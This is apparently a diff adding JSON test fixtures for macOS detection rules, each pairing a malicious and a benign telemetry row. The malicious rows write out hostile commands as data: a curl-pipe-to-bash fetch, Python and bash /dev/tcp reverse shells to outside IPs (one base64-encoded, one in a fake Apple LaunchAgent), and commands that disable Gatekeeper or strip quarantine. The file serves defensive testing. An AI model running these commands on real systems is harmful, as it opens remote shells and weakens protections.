@@ -1,0 +1,360 @@
+[
+  {
+    "filename": "macos_process_osascript_shell.yml",
+    "dataset": "macos.process",
+    "rule_id": "c5f6ef9f-53cf-4c6e-b763-c2b8e5660b4c",
+    "title": "macOS AppleScript shell execution via osascript",
+    "malicious_row": {
+      "Pid": 6120,
+      "Ppid": 842,
+      "Name": "osascript",
+      "Exe": "/usr/bin/osascript",
+      "CommandLine": "osascript -e do shell script \"curl -fsSL http://45.9.148.99/x.sh | bash\"",
+      "Username": "analyst",
+      "Mtime": "2026-07-03T10:15:22Z",
+      "CodeSignature": {
+        "Exists": true,
+        "Trusted": true,
+        "SubjectName": "Software Signing"
+      }
+    },
+    "benign_row": {
+      "Pid": 6210,
+      "Ppid": 842,
+      "Name": "osascript",
+      "Exe": "/usr/bin/osascript",
+      "CommandLine": "osascript -e display notification \"Backup complete\" with title \"TimeMachine\"",
+      "Username": "analyst",
+      "Mtime": "2026-07-03T10:20:00Z",
+      "CodeSignature": {
+        "Exists": true,
+        "Trusted": true,
+        "SubjectName": "Software Signing"
+      }
+    }
+  },
+  {
+    "filename": "macos_process_gatekeeper_sip_disable.yml",
+    "dataset": "macos.process",
+    "rule_id": "276aa6a8-b2eb-4c66-9d23-d6c91eeea0f2",
+    "title": "macOS Gatekeeper or SIP weakened via spctl or csrutil",
+    "malicious_row": {
+      "Pid": 6120,
+      "Ppid": 842,
+      "Name": "spctl",
+      "Exe": "/usr/sbin/spctl",
+      "CommandLine": "spctl --master-disable",
+      "Username": "analyst",
+      "Mtime": "2026-07-03T09:45:00Z",
+      "CodeSignature": {
+        "Exists": true,
+        "Trusted": true,
+        "SubjectName": "Software Signing"
+      }
+    },
+    "benign_row": {
+      "Pid": 6121,
+      "Ppid": 842,
+      "Name": "spctl",
+      "Exe": "/usr/sbin/spctl",
+      "CommandLine": "spctl --status",
+      "Username": "analyst",
+      "Mtime": "2026-07-03T09:46:00Z",
+      "CodeSignature": {
+        "Exists": true,
+        "Trusted": true,
+        "SubjectName": "Software Signing"
+      }
+    }
+  },
+  {
+    "filename": "macos_process_xattr_quarantine_strip.yml",
+    "dataset": "macos.process",
+    "rule_id": "0ec5b259-02e6-4c18-8427-81d5480bed24",
+    "title": "macOS quarantine attribute stripped via xattr",
+    "malicious_row": {
+      "Pid": 6001,
+      "Ppid": 842,
+      "Name": "xattr",
+      "Exe": "/usr/bin/xattr",
+      "CommandLine": "xattr -d com.apple.quarantine /Users/analyst/Downloads/Installer.app",
+      "Username": "analyst",
+      "Mtime": "2026-07-03T10:15:00Z"
+    },
+    "benign_row": {
+      "Pid": 6002,
+      "Ppid": 842,
+      "Name": "xattr",
+      "Exe": "/usr/bin/xattr",
+      "CommandLine": "xattr -l /Users/analyst/Downloads/photo.jpg",
+      "Username": "analyst",
+      "Mtime": "2026-07-03T10:16:00Z"
+    }
+  },
+  {
+    "filename": "macos_process_interpreter_inline_code.yml",
+    "dataset": "macos.process",
+    "rule_id": "28ff2821-6caa-4cd6-8706-7c8e5aabfe23",
+    "title": "macOS scripting interpreter executing inline code",
+    "malicious_row": {
+      "Pid": 5210,
+      "Ppid": 5099,
+      "Name": "python3",
+      "Exe": "/usr/bin/python3",
+      "CommandLine": "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"45.9.148.99\",4444));os.dup2(s.fileno(),0);subprocess.call([\"/bin/sh\",\"-i\"])'",
+      "Username": "analyst",
+      "Mtime": "2026-07-03T09:42:10Z",
+      "CodeSignature": {
+        "Exists": true,
+        "Trusted": true,
+        "SubjectName": "Software Signing"
+      }
+    },
+    "benign_row": {
+      "Pid": 5310,
+      "Ppid": 842,
+      "Name": "python3",
+      "Exe": "/usr/bin/python3",
+      "CommandLine": "/usr/bin/python3 /Users/analyst/build/setup.py install",
+      "Username": "analyst",
+      "Mtime": "2026-07-03T09:50:00Z",
+      "CodeSignature": {
+        "Exists": true,
+        "Trusted": true,
+        "SubjectName": "Software Signing"
+      }
+    }
+  },
+  {
+    "filename": "macos_process_base64_exec.yml",
+    "dataset": "macos.process",
+    "rule_id": "aa85c1e3-17fe-420f-ae04-8ddf93ecb9f6",
+    "title": "macOS base64-decoded payload piped to a shell or interpreter",
+    "malicious_row": {
+      "Pid": 6021,
+      "Ppid": 842,
+      "Name": "bash",
+      "Exe": "/bin/bash",
+      "CommandLine": "/bin/bash -c \"echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuNS80NDM= | base64 --decode | bash\"",
+      "Username": "analyst",
+      "Mtime": "2026-07-03T09:55:12Z",
+      "CodeSignature": {
+        "Exists": true,
+        "Trusted": true,
+        "SubjectName": "Software Signing"
+      }
+    },
+    "benign_row": {
+      "Pid": 7010,
+      "Ppid": 842,
+      "Name": "zsh",
+      "Exe": "/bin/zsh",
+      "CommandLine": "/bin/zsh -c \"cat token.b64 | base64 -d > /tmp/token.bin\"",
+      "Username": "analyst",
+      "Mtime": "2026-07-03T10:01:00Z",
+      "CodeSignature": {
+        "Exists": true,
+        "Trusted": true,
+        "SubjectName": "Software Signing"
+      }
+    }
+  },
+  {
+    "filename": "macos_persistence_reverse_shell.yml",
+    "dataset": "macos.persistence",
+    "rule_id": "c8b5850f-adce-4425-8248-2c235805d87a",
+    "title": "macOS persistence item runs a reverse or interactive shell",
+    "malicious_row": {
+      "Source": "LaunchAgents",
+      "OSPath": "/Users/analyst/Library/LaunchAgents/com.apple.systemupdate.plist",
+      "Path": "/Users/analyst/Library/LaunchAgents/com.apple.systemupdate.plist",
+      "Mtime": "2026-07-02T03:11:44Z",
+      "User": "analyst",
+      "LaunchdConfig": {
+        "Label": "com.apple.systemupdate",
+        "ProgramArguments": [
+          "/bin/bash",
+          "-c",
+          "bash -i >& /dev/tcp/185.220.101.4/4444 0>&1"
+        ],
+        "RunAtLoad": true,
+        "KeepAlive": true
+      },
+      "Hash": {
+        "SHA256": "3f1c0b9d5a7e2f84c6b1d0e9a8f7c6b5d4e3f2a1908172635445362718293a0b1"
+      }
+    },
+    "benign_row": {
+      "Source": "LaunchAgents",
+      "OSPath": "/Library/LaunchAgents/com.microsoft.update.agent.plist",
+      "Path": "/Library/LaunchAgents/com.microsoft.update.agent.plist",
+      "Mtime": "2025-05-10T09:00:00Z",
+      "LaunchdConfig": {
+        "Label": "com.microsoft.update.agent",
+        "ProgramArguments": [
+          "/Library/Application Support/Microsoft/MAU2.0/Microsoft AutoUpdate.app/Contents/MacOS/msupdate",
+          "--install"
+        ],
+        "RunAtLoad": true,
+        "KeepAlive": false
+      },
+      "Hash": {
+        "SHA256": "9a8b7c6d5e4f3a2b1c0d9e8f7a6b5c4d3e2f1a0b9c8d7e6f5a4b3c2d1e0f9a8b7"
+      }
+    }
+  },
+  {
+    "filename": "macos_tcc_postevent_non_apple.yml",
+    "dataset": "macos.tcc",
+    "rule_id": "2544c958-00fe-4402-b4fa-b1316d434327",
+    "title": "macOS synthetic-input (PostEvent) TCC grant to a non-Apple client",
+    "malicious_row": {
+      "Service": "kTCCServicePostEvent",
+      "Client": "/Users/Shared/.hidtool/injector",
+      "ClientType": 1,
+      "AuthValue": 2,
+      "LastModified": "2026-07-03T09:15:00Z",
+      "Path": "/Users/analyst/Library/Application Support/com.apple.TCC/TCC.db"
+    },
+    "benign_row": {
+      "Service": "kTCCServicePostEvent",
+      "Client": "com.apple.Accessibility",
+      "ClientType": 0,
+      "AuthValue": 2,
+      "LastModified": "2025-06-01T10:00:00Z",
+      "Path": "/Users/analyst/Library/Application Support/com.apple.TCC/TCC.db"
+    }
+  },
+  {
+    "filename": "macos_tcc_screen_recording_non_apple.yml",
+    "dataset": "macos.tcc",
+    "rule_id": "901a0ba3-59b5-4624-bbe2-96f26a1d2ffa",
+    "title": "macOS Screen Recording TCC grant to a non-Apple client",
+    "malicious_row": {
+      "Service": "kTCCServiceScreenCapture",
+      "Client": "/Users/Shared/.recorder/screencap",
+      "ClientType": 1,
+      "AuthValue": 2,
+      "LastModified": "2026-07-03T04:17:52Z",
+      "Path": "/Users/analyst/Library/Application Support/com.apple.TCC/TCC.db"
+    },
+    "benign_row": {
+      "Service": "kTCCServiceScreenCapture",
+      "Client": "com.apple.screencaptureui",
+      "ClientType": 0,
+      "AuthValue": 2,
+      "LastModified": "2026-06-30T09:12:00Z",
+      "Path": "/Users/analyst/Library/Application Support/com.apple.TCC/TCC.db"
+    }
+  },
+  {
+    "filename": "macos_tcc_appleevents_non_apple.yml",
+    "dataset": "macos.tcc",
+    "rule_id": "c64b2723-6ed4-4f56-98de-799f6492ccce",
+    "title": "macOS AppleEvents automation TCC grant to a non-Apple client",
+    "malicious_row": {
+      "Service": "kTCCServiceAppleEvents",
+      "Client": "com.malicious.dropper",
+      "ClientType": 0,
+      "AuthValue": 2,
+      "LastModified": "2026-07-03T14:22:10Z",
+      "Path": "/Users/analyst/Library/Application Support/com.apple.TCC/TCC.db"
+    },
+    "benign_row": {
+      "Service": "kTCCServiceAppleEvents",
+      "Client": "com.apple.Terminal",
+      "ClientType": 0,
+      "AuthValue": 2,
+      "LastModified": "2026-07-01T09:00:00Z",
+      "Path": "/Users/analyst/Library/Application Support/com.apple.TCC/TCC.db"
+    }
+  },
+  {
+    "filename": "macos_quarantine_tunneling_host.yml",
+    "dataset": "macos.quarantine",
+    "rule_id": "55dec845-c59f-495c-b318-e7e12050397f",
+    "title": "macOS quarantined download from a tunneling or anonymous file-sharing host",
+    "malicious_row": {
+      "LSQuarantineTimeStamp": "2026-07-03T14:22:09Z",
+      "LSQuarantineAgentName": "Google Chrome",
+      "LSQuarantineDataURLString": "https://a1b2c3d4.ngrok.io/Update.dmg",
+      "LSQuarantineOriginURLString": "https://a1b2c3d4.ngrok.io/download",
+      "LSQuarantineSenderName": null,
+      "Path": "/Users/analyst/Downloads/Update.dmg"
+    },
+    "benign_row": {
+      "LSQuarantineTimeStamp": "2026-07-03T09:15:00Z",
+      "LSQuarantineAgentName": "Safari",
+      "LSQuarantineDataURLString": "https://desktop.slack.com/mac/ssb/download",
+      "LSQuarantineOriginURLString": "https://slack.com/downloads/mac",
+      "LSQuarantineSenderName": "Slack",
+      "Path": "/Users/analyst/Downloads/Slack.dmg"
+    }
+  },
+  {
+    "filename": "macos_quarantine_url_shortener.yml",
+    "dataset": "macos.quarantine",
+    "rule_id": "59b36ae3-d0a1-4a55-9ea2-c3f128d1b9ab",
+    "title": "macOS quarantined download whose origin URL is a link shortener",
+    "malicious_row": {
+      "LSQuarantineTimeStamp": "2026-06-30T14:12:03Z",
+      "LSQuarantineAgentName": "Google Chrome",
+      "LSQuarantineDataURLString": "https://cdn.example-files.com/setup.dmg",
+      "LSQuarantineOriginURLString": "https://bit.ly/3xY9zAb",
+      "LSQuarantineSenderName": null,
+      "Path": "/Users/analyst/Downloads/setup.dmg"
+    },
+    "benign_row": {
+      "LSQuarantineTimeStamp": "2026-06-29T09:00:00Z",
+      "LSQuarantineAgentName": "Safari",
+      "LSQuarantineDataURLString": "https://dl.google.com/chrome/mac/universal/stable/GoogleChrome.dmg",
+      "LSQuarantineOriginURLString": "https://www.google.com/chrome/downloads/",
+      "LSQuarantineSenderName": "Google",
+      "Path": "/Users/analyst/Downloads/GoogleChrome.dmg"
+    }
+  },
+  {
+    "filename": "macos_inventory_known_adware.yml",
+    "dataset": "macos.inventory",
+    "rule_id": "afd7a471-a3c1-4faf-b02d-2878c4b834aa",
+    "title": "macOS known adware or PUP family present in installed-application inventory",
+    "malicious_row": {
+      "Name": "MacKeeper",
+      "BundleIdentifier": "com.mackeeper.MacKeeper",
+      "Version": "5.9.1",
+      "Path": "/Applications/MacKeeper.app",
+      "SignerCN": "Developer ID Application: Kromtech Alliance Corp (X3G7T239M4)",
+      "Mtime": "2026-06-15T10:00:00Z"
+    },
+    "benign_row": {
+      "Name": "Keeper Password Manager",
+      "BundleIdentifier": "com.callpod.KeeperDesktop",
+      "Version": "16.10.0",
+      "Path": "/Applications/Keeper Password Manager.app",
+      "SignerCN": "Developer ID Application: Keeper Security, Inc. (234QNB7GKG)",
+      "Mtime": "2026-05-01T09:00:00Z"
+    }
+  },
+  {
+    "filename": "macos_inventory_unsigned_in_applications.yml",
+    "dataset": "macos.inventory",
+    "rule_id": "95dc0b85-5b00-4b73-84e3-8ccceb583f66",
+    "title": "macOS unsigned application installed directly in /Applications",
+    "malicious_row": {
+      "Name": "SystemHelper",
+      "BundleIdentifier": "com.system.helper",
+      "Version": "1.0",
+      "Path": "/Applications/SystemHelper.app",
+      "SignerCN": null,
+      "Mtime": "2026-07-02T03:11:00Z"
+    },
+    "benign_row": {
+      "Name": "Firefox",
+      "BundleIdentifier": "org.mozilla.firefox",
+      "Version": "128.0",
+      "Path": "/Applications/Firefox.app",
+      "SignerCN": "Developer ID Application: Mozilla Corporation (43AQ936H96)",
+      "Mtime": "2025-06-15T10:00:00Z"
+    }
+  }
+]
